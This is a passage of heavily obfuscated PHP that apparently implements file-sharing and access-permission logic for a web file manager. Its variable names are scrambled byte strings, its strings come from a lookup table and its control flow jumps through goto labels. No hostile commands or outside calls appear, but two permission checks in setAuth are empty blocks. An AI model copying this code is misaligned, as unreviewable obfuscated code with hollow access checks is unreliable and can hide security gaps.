=> USER_ID), array($E’—ğ—ÖÇó[383] => SourceModel::TYPE_GROUP, $E’—ğ—ÖÇó[386] => array($E’—ğ—ÖÇó[7], $fä³¥¨²îæ)), $E’—ğ—ÖÇó[1635] => $E’—ğ—ÖÇó[1608]); } $A¢§äò“†æ = Model($E’—ğ—ÖÇó[411])->where($a„Šîù¯ŞÏ)->selectPage($C°Ú”ÚÇˆî); goto E‡¨õÊê¼Œ; eˆœß‰óÏ½: } protected function shareAdd($D†÷¥İŸœ², $dâ¤¶óÛÚÍ) { $d²£ã‡‚»î =& $_SERVER[ÍÓÖ€°å]; $fíÈ¤ÚÎ‚Ä = $this->_addShareData($D†÷¥İŸœ², $dâ¤¶óÛÚÍ); if (isset($dâ¤¶óÛÚÍ[$d²£ã‡‚»î[1640]]) && count($dâ¤¶óÛÚÍ[$d²£ã‡‚»î[1640]]) > 0) { $this->_shareAuthSet($fíÈ¤ÚÎ‚Ä, $dâ¤¶óÛÚÍ[$d²£ã‡‚»î[1640]]); } $this->shareEventAdd($D†÷¥İŸœ², $dâ¤¶óÛÚÍ, $d²£ã‡‚»î[739]); return $fíÈ¤ÚÎ‚Ä; } private function shareEventAdd($aõ¼Õ°Š‰ñ, $aÙöºÍËõ›, $D‘İ®òÌš« = "\x61\x64\144") { goto c±ØÎô‡›Ø; fø¡Í”…Šò: if ($c”ë¨ÑàŒ¢[$f”ØÏ™ù[408]] == $f”ØÏ™ù[393] && $aÙöºÍËõ›[$f”ØÏ™ù[408]] == $f”ØÏ™ù[367]) { $fŠ—ÓŠ–§Í = $f”ØÏ™ù[1642]; } if ($c”ë¨ÑàŒ¢[$f”ØÏ™ù[408]] == $f”ØÏ™ù[367] && $aÙöºÍËõ›[$f”ØÏ™ù[408]] == $f”ØÏ™ù[393]) { $fŠ—ÓŠ–§Í = $f”ØÏ™ù[1645]; } Model($f”ØÏ™ù[372])->eventShare($aõ¼Õ°Š‰ñ, $fŠ—ÓŠ–§Í); goto DŸŠç²é—£; c±ØÎô‡›Ø: $f”ØÏ™ù =& $_SERVER[ÍÓÖ€°å]; if ($D‘İ®òÌš« == $f”ØÏ™ù[739]) { if ($aÙöºÍËõ›[$f”ØÏ™ù[1634]] == $f”ØÏ™ù[367]) { Model($f”ØÏ™ù[372])->eventShare($aõ¼Õ°Š‰ñ, $f”ØÏ™ù[1641]); } if ($aÙöºÍËõ›[$f”ØÏ™ù[408]] == $f”ØÏ™ù[367]) { Model($f”ØÏ™ù[372])->eventShare($aõ¼Õ°Š‰ñ, $f”ØÏ™ù[1642]); } return; } $c”ë¨ÑàŒ¢ = $this->getInfoByPath($aõ¼Õ°Š‰ñ); goto bÌ™à­Ê›Ç; bÌ™à­Ê›Ç: $fŠ—ÓŠ–§Í = $f”ØÏ™ù[1643]; if ($c”ë¨ÑàŒ¢[$f”ØÏ™ù[1634]] == $f”ØÏ™ù[393] && $aÙöºÍËõ›[$f”ØÏ™ù[1634]] == $f”ØÏ™ù[367]) { $fŠ—ÓŠ–§Í = $f”ØÏ™ù[1641]; } if ($c”ë¨ÑàŒ¢[$f”ØÏ™ù[1634]] == $f”ØÏ™ù[367] && $aÙöºÍËõ›[$f”ØÏ™ù[1634]] == $f”ØÏ™ù[393]) { $fŠ—ÓŠ–§Í = $f”ØÏ™ù[1644]; } goto fø¡Í”…Šò; DŸŠç²é—£: return; goto c«£Œßå¿š; c«£Œßå¿š: } private function _addShareData($c»­§…‚, $aÁŒäÛÌ—š = array()) { goto BÖÒÂÇ£–; F—è­§£èé: $d¿ˆ»­ğá = array($E±–å¬²í™[1053] => USER_ID, $E±–å¬²í™[406] => $c»­§…‚, $E±–å¬²í™[968] => $E±–å¬²í™[33], $E±–å¬²í™[1634] => 0, $E±–å¬²í™[408] => 0, $E±–å¬²í™[556] => $E±–å¬²í™[33], $E±–å¬²í™[1646] => 0, $E±–å¬²í™[1647] => 0, $E±–å¬²í™[451] => 0, $E±–å¬²í™[1648] => $E±–å¬²í™[33], $E±–å¬²í™[1631] => $E±–å¬²í™[33]); $E†¡Ş¦³ = explode($E±–å¬²í™[47], $E±–å¬²í™[1649]); foreach ($E†¡Ş¦³ as $A¾Œ‰†±»¬) { $d¿ˆ»­ğá[$A¾Œ‰†±»¬] = $aÁŒäÛÌ—š[$A¾Œ‰†±»¬]; } goto DÅ¾ôÌ©‚Ó; b¸”ˆ¨†Ì¢: $aŒô†é¯¯“ = Model($E±–å¬²í™[512])->sourceInfo($c»­§…‚); if (!$aŒô†é¯¯“) { return !1; } if (!$aÁŒäÛÌ—š[$E±–å¬²í™[968]]) { $aÁŒäÛÌ—š[$E±–å¬²í™[968]] = $aŒô†é¯¯“[$E±–å¬²í™[28]]; } goto F—è­§£èé; DÅ¾ôÌ©‚Ó: $B¸³Â¡†—˜ = $this->add($d¿ˆ»­ğá); $bèÈÁºç§ = array($E±–å¬²í™[1631] => short_id($B¸³Â¡†—˜)); $this->where(array($E±–å¬²í™[1650] => $B¸³Â¡†—˜))->save($bèÈÁºç§); goto cÍ½¶Çƒçõ; cÍ½¶Çƒçõ: return $B¸³Â¡†—˜; goto Dâã³¾³ä; BÖÒÂÇ£–: $E±–å¬²í™ =& $_SERVER[ÍÓÖ€°å]; $Eëòåš–Ì = array($E±–å¬²í™[406] => $c»­§…‚, $E±–å¬²í™[1053] => USER_ID); if ($eÌÍï³”´ = $this->where($Eëòåš–Ì)->find()) { return $eÌÍï³”´[$E±–å¬²í™[410]]; } goto b¸”ˆ¨†Ì¢; Dâã³¾³ä: } private function _shareAuthSet($D‰¡‡ îÊ£, $fâå•Ú‘·Ó) { goto FÂ­ÏÔ©¡±; f¬»Ë¢Õ—…: return $E­âùÑèæà->addAll($CÙÊÙ“± , array(), !0); goto eŸš×ÀèÒ¼; BÖØ®Óö°²: $E­âùÑèæà->where(array($eÈÄå‘‹î[410] => $D‰¡‡ îÊ£))->delete(); $CÙÊÙ“±  = array(); foreach ($fâå•Ú‘·Ó as $DÙÔ–¹ãƒ) { $B÷äÒ²ƒõ = SourceModel::TYPE_USER; if ($DÙÔ–¹ãƒ[$eÈÄå‘‹î[384]] == SourceModel::TYPE_GROUP) { $B÷äÒ²ƒõ = SourceModel::TYPE_GROUP; } $B“°º¢‰ïó = array($eÈÄå‘‹î[410] => $D‰¡‡ îÊ£, $eÈÄå‘‹î[384] => $B÷äÒ²ƒõ, $eÈÄå‘‹î[386] => intval($DÙÔ–¹ãƒ[$eÈÄå‘‹î[386]]), $eÈÄå‘‹î[1652] => 0, $eÈÄå‘‹î[1653] => -1); if ($DÙÔ–¹ãƒ[$eÈÄå‘‹î[1652]]) { $B“°º¢‰ïó[$eÈÄå‘‹î[1652]] = $DÙÔ–¹ãƒ[$eÈÄå‘‹î[1652]]; } else { if ($DÙÔ–¹ãƒ[$eÈÄå‘‹î[1653]]) { $B“°º¢‰ïó[$eÈÄå‘‹î[1653]] = $DÙÔ–¹ãƒ[$eÈÄå‘‹î[1653]]; } } $CÙÊÙ“± [] = $B“°º¢‰ïó; } goto f¬»Ë¢Õ—…; FÂ­ÏÔ©¡±: $eÈÄå‘‹î =& $_SERVER[ÍÓÖ€°å]; if (!is_array($fâå•Ú‘·Ó)) { return !1; } $E­âùÑèæà = Model($eÈÄå‘‹î[1651]); goto BÖØ®Óö°²; eŸš×ÀèÒ¼: } public function numViewAdd($f’ÏÑ£Á¹§) { $Fëš¢îããî =& $_SERVER[ÍÓÖ€°å]; $FŸ¬†Ãè = array($Fëš¢îããî[1650] => $f’ÏÑ£Á¹§); $this->where($FŸ¬†Ãè)->setAdd($Fëš¢îããî[1646]); } public function numDownloadAdd($Fè¥ñ˜…áß) { $e¶×Å®ã‰Ü =& $_SERVER[ÍÓÖ€°å]; $c“öªŒç‚ù = array($e¶×Å®ã‰Ü[1650] => $Fè¥ñ˜…áß); $this->where($c“öªŒç‚ù)->setAdd($e¶×Å®ã‰Ü[1647]); } protected function shareEdit($dæÖ›°ö é, $EÒ–«íø¾) { goto bá”Ü“¨ßÔ; bá”Ü“¨ßÔ: $E•ª›òÜÕŒ =& $_SERVER[ÍÓÖ€°å]; $cõàòŠÁ—– = $this->getInfo($dæÖ›°ö é); if (!$cõàòŠÁ—–) { return !1; } goto AÑŒİôÂñù; cÇÓÎæ½ñù: $this->shareEventAdd($cõàòŠÁ—–[$E•ª›òÜÕŒ[365]], $EÒ–«íø¾, $E•ª›òÜÕŒ[1485]); $this->where(array($E•ª›òÜÕŒ[1650] => $dæÖ›°ö é))->save($D·°î‹’¼…); if (isset($EÒ–«íø¾[$E•ª›òÜÕŒ[1640]])) { $this->_shareAuthSet($dæÖ›°ö é, $EÒ–«íø¾[$E•ª›òÜÕŒ[1640]]); } goto dó¡ˆÀğÃÕ; AÑŒİôÂñù: $D·°î‹’¼… = array(); $Aé¿‹É¶Ó½ = explode($E•ª›òÜÕŒ[47], $E•ª›òÜÕŒ[1649]); foreach ($Aé¿‹É¶Ó½ as $F’‹›ìƒË‘) { if (!array_key_exists($F’‹›ìƒË‘, $EÒ–«íø¾)) { continue; } $D·°î‹’¼…[$F’‹›ìƒË‘] = $EÒ–«íø¾[$F’‹›ìƒË‘]; } goto cÇÓÎæ½ñù; dó¡ˆÀğÃÕ: return !0; goto dê°µƒ„Ä…; dê°µƒ„Ä…: } protected function remove($D»¼ÅĞ•®í, $dÕ‡“ëÓïÔ = USER_ID) { goto DÂ°ˆääñô; Eğ¿Õàğæà: for ($D©Û‰ğ¦ = 0; $D©Û‰ğ¦ < count($D›´‡øò); $D©Û‰ğ¦++) { $E˜™ÃÍ¼¥š = $this->getInfo($D›´‡øò[$D©Û‰ğ¦]); if ($E˜™ÃÍ¼¥š[$B¤Úğï†[408]] == $B¤Úğï†[367]) { Model($B¤Úğï†[372])->eventShare($E˜™ÃÍ¼¥š[$B¤Úğï†[365]], $B¤Úğï†[1645]); } if ($E˜™ÃÍ¼¥š[$B¤Úğï†[1634]] == $B¤Úğï†[367]) { Model($B¤Úğï†[372])->eventShare($E˜™ÃÍ¼¥š[$B¤Úğï†[365]], $B¤Úğï†[1644]); } } return $A¹Í—Ş‹Œ›; goto EËµˆ½öÌ°; DÂ°ˆääñô: $B¤Úğï† =& $_SERVER[ÍÓÖ€°å]; if (is_array($D»¼ÅĞ•®í)) { $D»¼ÅĞ•®í = array($B¤Úğï†[7], $D»¼ÅĞ•®í); } $f°®Ã±—ÂÜ = array($B¤Úğï†[1062] => $dÕ‡“ëÓïÔ, $B¤Úğï†[410] => $D»¼ÅĞ•®í); goto FèÇºÃä; FèÇºÃä: $A¹Í—Ş‹Œ› = $this->where($f°®Ã±—ÂÜ)->delete(); if ($A¹Í—Ş‹Œ›) { Model($B¤Úğï†[411])->where(array($B¤Úğï†[410] => $D»¼ÅĞ•®í))->delete(); } $D›´‡øò = is_array($D»¼ÅĞ•®í) ? $D»¼ÅĞ•®í[1] : array($D»¼ÅĞ•®í); goto Eğ¿Õàğæà; EËµˆ½öÌ°: } public function listAll($d„ö¹İ‘ù‘) { goto fŞÁ—Õ¢Û‘; fŞÁ—Õ¢Û‘: $d¼œæ¢«Î =& $_SERVER[ÍÓÖ€°å]; $e‘ã§†Šöë = array(); if ($d„ö¹İ‘ù‘[$d¼œæ¢«Î[1062]]) { $e‘ã§†Šöë[$d¼œæ¢«Î[1062]] = $d„ö¹İ‘ù‘[$d¼œæ¢«Î[1062]]; } goto A¨œÂ¯éç§; A¨œÂ¯éç§: if ($d„ö¹İ‘ù‘[$d¼œæ¢«Î[450]]) { $e¯¶âÍ = $d„ö¹İ‘ù‘[$d¼œæ¢«Î[451]] ? $d„ö¹İ‘ù‘[$d¼œæ¢«Î[451]] : strtotime(date($d¼œæ¢«Î[1654])); $e‘ã§†Šöë[$d¼œæ¢«Î[175]] = array($d¼œæ¢«Î[313], array($d„ö¹İ‘ù‘[$d¼œæ¢«Î[450]], $e¯¶âÍ)); } if ($d„ö¹İ‘ù‘[$d¼œæ¢«Î[29]]) { $e‘ã§†Šöë[$d„ö¹İ‘ù‘[$d¼œæ¢«Î[29]]] = 1; } else { $e‘ã§†Šöë[] = array($d¼œæ¢«Î[1634] => array($d¼œæ¢«Î[681], 0), $d¼œæ¢«Î[408] => array($d¼œæ¢«Î[681], 0), $d¼œæ¢«Î[1635] => $d¼œæ¢«Î[1608]); } $a‘¡Œ¡¡‹Ñ = $this->_makeOrder()->where($e‘ã§†Šöë)->selectPage(20); goto cšÁ‰ç£Õ; cšÁ‰ç£Õ: if (empty($a‘¡Œ¡¡‹Ñ[$d¼œæ¢«Î[345]])) { return array(); } $this->_listDataApply($a‘¡Œ¡¡‹Ñ[$d¼œæ¢«Î[345]]); return $a‘¡Œ¡¡‹Ñ; goto B£Ûª‚¡Ò„; B£Ûª‚¡Ò„: } private function _listDataApply(&$Fõò¢Åòª’) { $e»ÓÛ›½œ² =& $_SERVER[ÍÓÖ€°å]; $FÚŸÎ´‰”Ê = array_to_keyvalue($Fõò¢Åòª’, $e»ÓÛ›½œ²[33], $e»ÓÛ›½œ²[1062]); $D–ÏÑÜèÎ— = Model($e»ÓÛ›½œ²[1452])->userListInfo(array_unique($FÚŸÎ´‰”Ê)); $Câ½“Ä²á® = array_to_keyvalue($Fõò¢Åòª’, $e»ÓÛ›½œ²[33], $e»ÓÛ›½œ²[365]); $aæ–Ê‘Ò¯â = Model($e»ÓÛ›½œ²[512])->sourceListInfo($Câ½“Ä²á®, !0); foreach ($Fõò¢Åòª’ as &$dÃ„±ƒğ”š) { $dƒ³‡Â†“‚ = $dÃ„±ƒğ”š[$e»ÓÛ›½œ²[1062]]; $dÃ„±ƒğ”š[$e»ÓÛ›½œ²[1655]] = $D–ÏÑÜèÎ—[$dƒ³‡Â†“‚] ? $D–ÏÑÜèÎ—[$dƒ³‡Â†“‚] : !1; $A‚ï„Â²ºÂ = $dÃ„±ƒğ”š[$e»ÓÛ›½œ²[365]]; $dÃ„±ƒğ”š[$e»ÓÛ›½œ²[1618]] = $aæ–Ê‘Ò¯â[$A‚ï„Â²ºÂ] ? $aæ–Ê‘Ò¯â[$A‚ï„Â²ºÂ] : !1; } } private function _makeOrder($fêçæŠ±µˆ = '') { goto EË­¹Í¤£×; A¿–Äœ³¢Û: $aàó¿íœŸ = Input::get($Aç§»Šİ‚Í[1556], $Aç§»Šİ‚Í[7], $Aç§»Šİ‚Í[1557], $aÚø”¥Œ°); $bøÕÀñÇë¾ = Input::get($Aç§»Šİ‚Í[1558], $Aç§»Šİ‚Í[7], $Aç§»Šİ‚Í[1656], array($Aç§»Šİ‚Í[1603], $Aç§»Šİ‚Í[1484])); $bøÕÀñÇë¾ = $AÎ†êÙÏ­—[$bøÕÀñÇë¾]; goto Aå·¦‡ŞĞ¥; EË­¹Í¤£×: $Aç§»Šİ‚Í =& $_SERVER[ÍÓÖ€°å]; $aÚø”¥Œ° = array($Aç§»Šİ‚Í[175], $Aç§»Šİ‚Í[451], $Aç§»Šİ‚Í[1646], $Aç§»Šİ‚Í[1647]); $AÎ†êÙÏ­— = array($Aç§»Šİ‚Í[1601] => $Aç§»Šİ‚Í[1602], $Aç§»Šİ‚Í[1484] => $Aç§»Šİ‚Í[1560]); goto A¿–Äœ³¢Û; Aå·¦‡ŞĞ¥: $fêçæŠ±µˆ = $fêçæŠ±µˆ . "{$aàó¿íœŸ}\40{$bøÕÀñÇë¾}"; return $this->order($fêçæŠ±µˆ); goto AĞ¨¯ÌÓ™ˆ; AĞ¨¯ÌÓ™ˆ: } } class SourceAuthModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\x73\x6f\165\x72\x63\x65\137\141\x75\x74\x68"; public function getAuth($F±“§ó™¿) { goto a•¶«È’¿“; fèèô îï¸: $BÚ°Ÿé²¥æ = $this->field($Cò¨£ßà„‡)->order($eŠåÑõ·Ÿ–[357])->where($DÛ¬¥œÑ²Ï)->select(); $F·ôˆá¾ƒµ = array(); foreach ($BÚ°Ÿé²¥æ as $D©‰½¢¶„) { if (Model($eŠåÑõ·Ÿ–[1658])->listData($D©‰½¢¶„[$eŠåÑõ·Ÿ–[1652]])) { $F·ôˆá¾ƒµ[] = $D©‰½¢¶„; } } goto cã‘’ïïĞä; a•¶«È’¿“: $eŠåÑõ·Ÿ– =& $_SERVER[ÍÓÖ€°å]; $Cò¨£ßà„‡ = $eŠåÑõ·Ÿ–[1657]; $DÛ¬¥œÑ²Ï = array($eŠåÑõ·Ÿ–[365] => $F±“§ó™¿); goto fèèô îï¸; cã‘’ïïĞä: return $F·ôˆá¾ƒµ; goto A¾”Ü„¹¶; A¾”Ü„¹¶: } public function setAuth($e‘”Õ‰», $c»×µßø) { goto FğšãåŞ±“; bšç‡³‹İª: $dØÜÏíŒéË = 1; $aÒ„õ˜òä§ = $DÒš¶šŞÇ¥[$fÍšÖÃ†ÀŠ[386]]; if ($aÒ„õ˜òä§ != $dØÜÏíŒéË) { $bÏŞØìîİ = array($fÍšÖÃ†ÀŠ[1516] => $aÒ„õ˜òä§); $CÚ“òÈáëõ = Model($fÍšÖÃ†ÀŠ[1600])->field($fÍšÖÃ†ÀŠ[1062])->where($bÏŞØìîİ)->select(); $CÚ“òÈáëõ = array_to_keyvalue($CÚ“òÈáëõ, $fÍšÖÃ†ÀŠ[33], $fÍšÖÃ†ÀŠ[1062]); } goto B§ºÃ…ŞÑ; d¥äÓ³›“†: $this->where(array($fÍšÖÃ†ÀŠ[406] => $e‘”Õ‰»))->delete(); $this->addAll($e‰ÊáÂŞ·); return !0; goto B’ë ²¦æ; B§ºÃ…ŞÑ: $E•ÂÙŠšŒÊ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $e‰ÊáÂŞ· = array(); foreach ($c»×µßø as $dÀ•Á‡§å) { if (!in_array($dÀ•Á‡§å[$fÍšÖÃ†ÀŠ[384]], $E•ÂÙŠšŒÊ)) { show_json(LNG($fÍšÖÃ†ÀŠ[1659]), !1); } if ($aÒ„õ˜òä§ != $dØÜÏíŒéË) { if ($dÀ•Á‡§å[$fÍšÖÃ†ÀŠ[384]] == SourceModel::TYPE_GROUP) { } if ($dÀ•Á‡§å[$fÍšÖÃ†ÀŠ[386]] != 0 && !in_array($dÀ•Á‡§å[$fÍšÖÃ†ÀŠ[386]], $CÚ“òÈáëõ)) { } } if ($dÀ•Á‡§å[$fÍšÖÃ†ÀŠ[386]] == 0) { $dÀ•Á‡§å[$fÍšÖÃ†ÀŠ[384]] = SourceModel::TYPE_USER; } $e‰ÊáÂŞ·[] = array($fÍšÖÃ†ÀŠ[365] => $e‘”Õ‰», $fÍšÖÃ†ÀŠ[384] => intval($dÀ•Á‡§å[$fÍšÖÃ†ÀŠ[384]]), $fÍšÖÃ†ÀŠ[386] => intval($dÀ•Á‡§å[$fÍšÖÃ†ÀŠ[386]]), $fÍšÖÃ†ÀŠ[1652] => intval($dÀ•Á‡§å[$fÍšÖÃ†ÀŠ[1652]]) ? intval($dÀ•Á‡§å[$fÍšÖÃ†ÀŠ[1652]]) : 0, $fÍšÖÃ†ÀŠ[1653] => intval($dÀ•Á‡§å[$fÍšÖÃ†ÀŠ[1653]]) ? intval($dÀ•Á‡§å[$fÍšÖÃ†ÀŠ[1653]]) : -1); } goto d¥äÓ³›“†; FğšãåŞ±“: $fÍšÖÃ†ÀŠ =& $_SERVER[ÍÓÖ€°å]; $DÒš¶šŞÇ¥ = Model($fÍšÖÃ†ÀŠ[827])->sourceInfo($e‘”Õ‰»); if ($DÒš¶šŞÇ¥[$fÍšÖÃ†ÀŠ[384]] != SourceModel::TYPE_GROUP) { return !1; } goto bšç‡³‹İª; B’ë ²¦æ: } public function authClear($bÏ¡Ô¤ÁØé) { $EòÙâÔšˆĞ =& $_SERVER[ÍÓÖ€°å]; $D®ÑáŠœ = Model($EòÙâÔšˆĞ[827])->sourceInfo($bÏ¡Ô¤ÁØé); $c·©×Ç‡‡Õ = array($bÏ¡Ô¤ÁØé); if ($D®ÑáŠœ[$EòÙâÔšˆĞ[366]] == $EòÙâÔšˆĞ[367]) { $fì½õÈá°“ = array($EòÙâÔšˆĞ[390] => array($EòÙâÔšˆĞ[399], $D®ÑáŠœ[$EòÙâÔšˆĞ[364]] . $bÏ¡Ô¤ÁØé . $EòÙâÔšˆĞ[400])); $c·©×Ç‡‡Õ = Model($EòÙâÔšˆĞ[827])->field($EòÙâÔšˆĞ[406])->where($fì½õÈá°“)->getField($EòÙâÔšˆĞ[365], !0); $c·©×Ç‡‡Õ[] = $bÏ¡Ô¤ÁØé; } $this->where(array($EòÙâÔšˆĞ[406] => array($EòÙâÔšˆĞ[946], $c·©×Ç‡‡Õ)))->delete(); return !0; } public function get($EÂ ¬ÑòØã) { $BÚ§íÆÖÉË = $this->getSourceList(array($EÂ ¬ÑòØã), !0); return $BÚ§íÆÖÉË[0]; } public function getSourceList($cÈƒÄÎØÒ·, $e“ñô‚³Ù = false) { goto aá›èÂ½÷Å; CÚÔ‹¢‘ò: $c…˜š²„´» = array($EÂÃÄ‘¿¼“[406] => array($EÂÃÄ‘¿¼“[946], $F…Û¡’ÔÀ¾)); $BÄÏ×èÚÂˆ = $this->field($f– ¤ƒöé )->where($c…˜š²„´»)->select(); $BÄÏ×èÚÂˆ = array_to_keyvalue_group($BÄÏ×èÚÂˆ, $EÂÃÄ‘¿¼“[365]); goto BÊœãããÚ; BÊœãããÚ: $B—Öİ’ÈƒÓ = array(); foreach ($e“ñô‚³Ù as $Cè³³òªç• => $Bá†…ø¦éµ) { $B—Öİ’ÈƒÓ[$Cè³³òªç•] = $this->makeSourceAuth($Bá†…ø¦éµ, $BÄÏ×èÚÂˆ); } return $B—Öİ’ÈƒÓ; goto c´­–Œ“µ; aá›èÂ½÷Å: $EÂÃÄ‘¿¼“ =& $_SERVER[ÍÓÖ€°å]; if (!$cÈƒÄÎØÒ·) { return array(); } $F–íœ¤‰æñ = Model($EÂÃÄ‘¿¼“[827]); goto cˆª‚×ïñ‡; cˆª‚×ïñ‡: if (!$e“ñô‚³Ù) { $c…˜š²„´» = array($EÂÃÄ‘¿¼“[406] => array($EÂÃÄ‘¿¼“[946], $cÈƒÄÎØÒ·)); $e“ñô‚³Ù = $F–íœ¤‰æñ->field($EÂÃÄ‘¿¼“[1660])->where($c…˜š²„´»)->select(); $e“ñô‚³Ù = array_to_keyvalue($e“ñô‚³Ù, $EÂÃÄ‘¿¼“[365]); } $F…Û¡’ÔÀ¾ = $cÈƒÄÎØÒ·; foreach ($e“ñô‚³Ù as $bÊäôÇ·´­ => $E„¨è‡–äÖ) { $f†œÛ¼°ÕŒ = $F–íœ¤‰æñ->parentLevelArray($E„¨è‡–äÖ[$EÂÃÄ‘¿¼“[364]]); $F…Û¡’ÔÀ¾ = array_merge($F…Û¡’ÔÀ¾, $f†œÛ¼°ÕŒ, array($bÊäôÇ·´­)); } goto dÜ©•ÀÜÒŠ; dÜ©•ÀÜÒŠ: $F…Û¡’ÔÀ¾ = array_values(array_unique($F…Û¡’ÔÀ¾)); if (!$F…Û¡’ÔÀ¾) { return array(); } $f– ¤ƒöé  = $EÂÃÄ‘¿¼“[1661]; goto CÚÔ‹¢‘ò; c´­–Œ“µ: } public function authDeepCheck($E¥ê¼£¹Ü¥, $DšÆø©äŠÎ = false) { $C‡×´ÕŸ÷ =& $_SERVER[ÍÓÖ€°å]; if ($GLOBALS[$C‡×´ÕŸ÷[997]]) { return !1; } $a¦­ÍÔµÍÇ = $this->makeAuthDeep(); if (!in_array($E¥ê¼£¹Ü¥, $a¦­ÍÔµÍÇ)) { return !1; } return array($C‡×´ÕŸ÷[1662] => -1, $C‡×´ÕŸ÷[1663] => array($C‡×´ÕŸ÷[789] => $C‡×´ÕŸ÷[756], $C‡×´ÕŸ÷[1522] => $C‡×´ÕŸ÷[393], $C‡×´ÕŸ÷[378] => LNG($C‡×´ÕŸ÷[1664]), $C‡×´ÕŸ÷[1534] => $C‡×´ÕŸ÷[1665])); } protected function makeAuthDeep() { goto cŠï„ËÕÓæ; E¬«áá¼×Í: return $cöäƒ©”„Å; goto b ƒ—‡ ­ö; a•å‰î‚ëÜ: $F¸ ÷×Ø¨œ = Model($C›ùÈ‰¹ÄÈ[827]); $C·Š³ÃŠÍ‡ = Model($C›ùÈ‰¹ÄÈ[1669]); if ($e’ßÕÏ®¢) { $FÙé”è‘˜„ = $F¸ ÷×Ø¨œ->where(array($C›ùÈ‰¹ÄÈ[365] => array($C›ùÈ‰¹ÄÈ[946], $e’ßÕÏ®¢)))->select(); foreach ($FÙé”è‘˜„ as $bÑµä¦½Ô) { $EÇÜÅ…ç…” = $F¸ ÷×Ø¨œ->parentLevelArray($bÑµä¦½Ô[$C›ùÈ‰¹ÄÈ[364]]); $cöäƒ©”„Å = array_merge($cöäƒ©”„Å, $EÇÜÅ…ç…”); $b£”ñ¯œ‹Í[] = $bÑµä¦½Ô[$C›ùÈ‰¹ÄÈ[386]]; } } goto EÁá«Ö‡“»; b¬Ì»ê‘: $Fƒ¹ä¤µã = Model($C›ùÈ‰¹ÄÈ[1666])->listData(); $EÍÒ­´´â = array(); foreach ($Fƒ¹ä¤µã as $DßËĞ’ğÏÚ) { if ($DßËĞ’ğÏÚ[$C›ùÈ‰¹ÄÈ[540]] == 0 && $DßËĞ’ğÏÚ[$C›ùÈ‰¹ÄÈ[1536]] == $C›ùÈ‰¹ÄÈ[367]) { $EÍÒ­´´â[] = $DßËĞ’ğÏÚ[$C›ùÈ‰¹ÄÈ[357]]; } } goto a±ºÁ‰§ß; EÁá«Ö‡“»: $b£”ñ¯œ‹Í = array_values(array_unique($b£”ñ¯œ‹Í)); $EËÏæ±°ê = $b£”ñ¯œ‹Í; foreach ($EËÏæ±°ê as $eáÀö»Ñ‰) { $A‘µá…ÛÚ = $C·Š³ÃŠÍ‡->getInfo($eáÀö»Ñ‰); $EÇÜÅ…ç…” = $F¸ ÷×Ø¨œ->parentLevelArray($A‘µá…ÛÚ[$C›ùÈ‰¹ÄÈ[364]]); $b£”ñ¯œ‹Í = array_merge($b£”ñ¯œ‹Í, $EÇÜÅ…ç…”); } goto eÏâÏ›­‚; FÑÛµ˜Ğë¾: if ($cöÒ‡¾«â) { $c¨†•ë”–Ù = array(array($C›ùÈ‰¹ÄÈ[384] => SourceModel::TYPE_USER, $C›ùÈ‰¹ÄÈ[386] => USER_ID), array($C›ùÈ‰¹ÄÈ[384] => SourceModel::TYPE_GROUP, $C›ùÈ‰¹ÄÈ[386] => array($C›ùÈ‰¹ÄÈ[946], $cöÒ‡¾«â)), $C›ùÈ‰¹ÄÈ[669] => $C›ùÈ‰¹ÄÈ[1608]); } if ($EÍÒ­´´â) { $c¨†•ë”–Ù = array($c¨†•ë”–Ù, $C›ùÈ‰¹ÄÈ[1652] => array($C›ùÈ‰¹ÄÈ[1667], $EÍÒ­´´â)); } $F›Òğôˆ¶ = $this->field($C›ùÈ‰¹ÄÈ[1668])->where($c¨†•ë”–Ù)->select(); goto D…¾™öÚŸ; eÏâÏ›­‚: $b£”ñ¯œ‹Í = array_values(array_unique($b£”ñ¯œ‹Í)); foreach ($b£”ñ¯œ‹Í as $eáÀö»Ñ‰) { $A‘µá…ÛÚ = $C·Š³ÃŠÍ‡->getInfo($eáÀö»Ñ‰); $cöäƒ©”„Å[] = $A‘µá…ÛÚ[$C›ùÈ‰¹ÄÈ[1618]][$C›ùÈ‰¹ÄÈ[365]]; } $cöäƒ©”„Å = array_values(array_unique($cöäƒ©”„Å)); goto E¬«áá¼×Í; D…¾™öÚŸ: $e’ßÕÏ®¢ = array_to_keyvalue($F›Òğôˆ¶, $C›ùÈ‰¹ÄÈ[33], $C›ùÈ‰¹ÄÈ[365]); $cöäƒ©”„Å = array(); $b£”ñ¯œ‹Í = $cöÒ‡¾«â; goto a•å‰î‚ëÜ; cŠï„ËÕÓæ: $C›ùÈ‰¹ÄÈ =& $_SERVER[ÍÓÖ€°å]; static $cöäƒ©”„Å = false; if ($cöäƒ©”„Å) { return $cöäƒ©”„Å; } goto b¬Ì»ê‘; a±ºÁ‰§ß: $cöÒ‡¾«â = Session::get($C›ùÈ‰¹ÄÈ[1636]); $cöÒ‡¾«â = array_to_keyvalue($cöÒ‡¾«â, $C›ùÈ‰¹ÄÈ[33], $C›ùÈ‰¹ÄÈ[1516]); $c¨†•ë”–Ù = array($C›ùÈ‰¹ÄÈ[384] => SourceModel::TYPE_USER, $C›ùÈ‰¹ÄÈ[386] => USER_ID); goto FÑÛµ˜Ğë¾; b ƒ—‡ ­ö: } private function makeSourceAuth($a’İğÒĞ›ã, $F¨Ü™‘•õ®) { goto C—áÓÍ˜ÛÙ; dÊšá‰Æ™¹: if (!$F®Äáó‚) { $c¶ï¤“òİ´ = array_to_keyvalue($c¶ï¤“òİ´, $DÎ÷ó›Ğ²[1516]); $B¯ÆáëÆÕµ = $a’İğÒĞ›ã[$DÎ÷ó›Ğ²[386]]; $E¶ƒ‰ÊÌ = isset($c¶ï¤“òİ´[$B¯ÆáëÆÕµ]) ? $c¶ï¤“òİ´[$B¯ÆáëÆÕµ] : !1; if ($E¶ƒ‰ÊÌ) { $F®Äáó‚ = array($DÎ÷ó›Ğ²[1670] => intval($E¶ƒ‰ÊÌ[$DÎ÷ó›Ğ²[540]][$DÎ÷ó›Ğ²[540]]), $DÎ÷ó›Ğ²[1671] => $E¶ƒ‰ÊÌ[$DÎ÷ó›Ğ²[540]]); } } if ((!$F®Äáó‚ || $F®Äáó‚[$DÎ÷ó›Ğ²[1662]] <= 0) && $a’İğÒĞ›ã[$DÎ÷ó›Ğ²[384]] == SourceModel::TYPE_GROUP) { $F®Äáó‚ = $this->authDeepCheck($a’İğÒĞ›ã[$DÎ÷ó›Ğ²[365]], $F®Äáó‚); } return $F®Äáó‚; goto 